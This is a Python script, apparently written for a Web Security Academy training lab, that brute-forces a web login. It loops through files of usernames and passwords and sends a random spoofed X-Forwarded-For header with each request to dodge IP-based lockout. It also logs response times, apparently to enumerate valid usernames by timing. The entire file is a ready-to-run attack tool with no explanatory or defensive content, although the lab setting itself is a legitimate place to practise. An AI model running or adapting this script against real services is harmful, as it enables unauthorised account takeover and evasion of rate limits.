import requests
import time
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a6300e20407aa6c80bc76670093000e.web-security-academy.net/login"
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
# Read usernames from a text file
with open('usernames.txt', 'r') as file:
    usernames = [line.strip() for line in file]
with open('passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file]
print(f"Usernames: {usernames}")
print(f"Passwords: {passwords}")


# Function to brute-force with custom headers and log response time
def brute_force(url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            headers = {
                "User-Agent": "CustomUserAgent",
                "X-Custom-Header": "CustomValue",
                "X-Forwarded-for": generate_random_ip(),
            }
            
            # Measure start time
            start_time = time.time()

            # Send POST request with credentials
            response = requests.post(url, headers=headers,proxies=proxies, data={
                "username": username,
                "password": password
            }, verify=False)

            # Calculate response time
            response_time = time.time() - start_time
            print(f"Trying {username}:{password} |header {headers}| Response Time: {response_time:.4f} seconds")

            # Check response to see if login is successful (modify as needed)
            if "Welcome" in response.text:  # Adjust based on success indicator
                print(f"Successful login! Username: {username}, Password: {password}")
                return

# Run brute-force attack
brute_force(url, usernames, passwords)
